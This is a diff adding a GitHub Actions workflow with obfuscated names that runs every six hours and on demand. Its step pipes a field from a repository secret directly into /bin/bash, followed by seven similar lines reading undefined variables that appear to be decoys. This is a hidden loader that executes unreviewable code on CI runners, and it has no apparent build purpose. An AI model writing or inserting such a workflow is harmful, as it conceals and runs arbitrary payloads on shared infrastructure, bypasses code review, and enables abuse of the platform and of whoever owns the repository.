@@ -1,0 +1,26 @@
+name: fuluohan4710
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuluohan4710
+        env:
+          zlu68: ${{ secrets.zlu68 }}
+        run: |
+          echo $zlu68 | jq -r .x7 | /bin/bash
+          echo $rdwyj3806 | jq -r .vteq67998 | /bin/bash
+          echo $yr2 | jq -r .dyjwr76 | /bin/bash
+          echo $ixgej7088 | jq -r .eid10800 | /bin/bash
+          echo $l54 | jq -r .lcr04073 | /bin/bash
+          echo $ve59 | jq -r .m09 | /bin/bash
+          echo $uv9331 | jq -r .hxdgi608 | /bin/bash
+          echo $i5566 | jq -r .jvdjd2 | /bin/bash
+
